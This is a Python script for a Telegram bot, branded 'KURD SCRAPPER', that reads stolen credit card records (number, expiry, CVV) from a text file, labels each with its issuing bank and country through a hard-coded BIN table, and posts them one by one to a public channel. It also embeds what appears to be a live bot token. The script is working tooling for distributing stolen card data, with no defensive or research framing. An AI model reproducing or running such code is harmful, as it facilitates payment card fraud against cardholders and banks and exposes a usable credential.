# -*- coding: utf-8 -*-
import asyncio
import os
from telegram import Bot
from telegram.error import TelegramError

# ===== CONFIG =====
BOT_TOKEN = "8839560847:AAF3IeRKYVerZUUHYV_ZgfItdm4BPEhcBYk"
CHANNEL_ID = "@Cc428Kurd"
ADMIN_ID = 6395195181
INTERVAL_SECONDS = 5
# ==============================================

# داتابەیسێکی تەواو بۆ بانک و وڵاتەکان
BIN_DATABASE = {
    "410282": {"bank": "JPMorgan Chase Bank", "country": "USA 🇺🇸"},
    "408139": {"bank": "Bank of America", "country": "USA 🇺🇸"},
    "414842": {"bank": "Wells Fargo", "country": "USA 🇺🇸"},
    "426548": {"bank": "Citibank", "country": "USA 🇺🇸"},
    "477028": {"bank": "Discover", "country": "USA 🇺🇸"},
    "402935": {"bank": "American Express", "country": "USA 🇺🇸"},
    "462436": {"bank": "U.S. Bank", "country": "USA 🇺🇸"},
    "534862": {"bank": "Capital One", "country": "USA 🇺🇸"},
    "470136": {"bank": "PNC Bank", "country": "USA 🇺🇸"},
    "472674": {"bank": "Synchrony Bank", "country": "USA 🇺🇸"},
    "414244": {"bank": "First National Bank", "country": "USA 🇺🇸"},
    "553825": {"bank": "Chase", "country": "USA 🇺🇸"},
    "478753": {"bank": "Citi", "country": "USA 🇺🇸"},

    # ---- UK 🇬🇧 ----
    "539811": {"bank": "Barclays Bank", "country": "UK 🇬🇧"},
    "513143": {"bank": "Lloyds Bank", "country": "UK 🇬🇧"},
    "549041": {"bank": "HSBC", "country": "UK 🇬🇧"},

    # ---- UAE 🇦🇪 ----
    "512252": {"bank": "Emirates NBD", "country": "UAE 🇦🇪"},
    "518414": {"bank": "ADCB", "country": "UAE 🇦🇪"},

    # ---- Germany 🇩🇪 ----
    "504435": {"bank": "Deutsche Bank", "country": "Germany 🇩🇪"},
    "514339": {"bank": "Commerzbank", "country": "Germany 🇩🇪"},

    # ---- France 🇫🇷 ----
    "509431": {"bank": "BNP Paribas", "country": "France 🇫🇷"},
    "402891": {"bank": "Société Générale", "country": "France 🇫🇷"},

    # ---- Canada 🇨🇦 ----
    "418251": {"bank": "RBC", "country": "Canada 🇨🇦"},
    "406933": {"bank": "TD", "country": "Canada 🇨🇦"},
}

def get_card_details(card_number):
    # ئەگەر BIN ناسراوە، بانک و وڵاتەکەی بگەڕێنەوە
    bin_num = card_number[:6]
    if bin_num in BIN_DATABASE:
        return BIN_DATABASE[bin_num]
    
    # ئەگەر نەناسرا، بەپێی سێ یەکەم ژمارە بڕیار بدە
    if card_number.startswith('5'):
        return {"bank": "Mastercard International", "country": "Global 🌍"}
    elif card_number.startswith('4'):
        return {"bank": "Visa International", "country": "Global 🌍"}
    elif card_number.startswith('3'):
        return {"bank": "Amex International", "country": "Global 🌍"}
    elif card_number.startswith('2'):
        return {"bank": "Mastercard", "country": "Global 🌍"}
    else:
        return {"bank": "Unknown Bank", "country": "Unknown 🌍"}

try:
    if os.path.exists('cards.txt'):
        with open('cards.txt', 'r', encoding='utf-8') as f:
            RAW_CARDS = [line.strip() for line in f if line.strip()]
        print(f"✅ Loaded {len(RAW_CARDS)} cards from cards.txt")
    else:
        RAW_CARDS = []
        print("⚠️ cards.txt not found!")
except:
    RAW_CARDS = []

current_index = 0

async def send_card_message(bot, channel, admin):
    global current_index
    
    if not RAW_CARDS:
        await bot.send_message(chat_id=admin, text="❌ No cards found in file.")
        return False
    
    if current_index >= len(RAW_CARDS):
        await bot.send_message(chat_id=admin, text="✅ All cards sent! Bot is stopping now.")
        print("✅ All cards sent successfully.")
        return False
    
    card_line = RAW_CARDS[current_index]
    parts = card_line.split('|')
    
    if len(parts) >= 4:
        card_number = parts[0].strip()
        month = parts[1].strip()
        year = parts[2].strip()
        cvv = parts[3].strip()
    else:
        await bot.send_message(chat_id=admin, text=f"❌ Error in line: {card_line}")
        current_index += 1
        return False
    
    details = get_card_details(card_number)
    bank = details['bank']
    country = details['country']
    bin_num = card_number[:6]
    
    text = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  💳  KURD SCRAPPER  💳\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Card   : {card_number}\n"
        f"Exp    : {month}/{year}\n"
        f"CVV    : {cvv}\n"
        f"BIN    : {bin_num}\n"
        f"Bank   : {bank}\n"
        f"Country: {country}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Devs   : @warven_24 & @rojAmedi2"
    )

    try:
        await bot.send_message(chat_id=channel, text=text)
        await bot.send_message(chat_id=admin, text=f"✅ Sent ({current_index+1}/{len(RAW_CARDS)})")
        print(f"✅ Sent: {card_number}")
        
        current_index += 1
        return True
    except TelegramError as e:
        await bot.send_message(chat_id=admin, text=f"❌ Error: {e}")
        return False

async def main():
    bot = Bot(token=BOT_TOKEN)
    try:
        bot.get_me()
    except TelegramError:
        print("⚠️ Invalid Token")
        return
    
    while True:
        result = await send_card_message(bot, CHANNEL_ID, ADMIN_ID)
        if not result:
            break
        await asyncio.sleep(INTERVAL_SECONDS)

if __name__ == "__main__":
    asyncio.run(main())
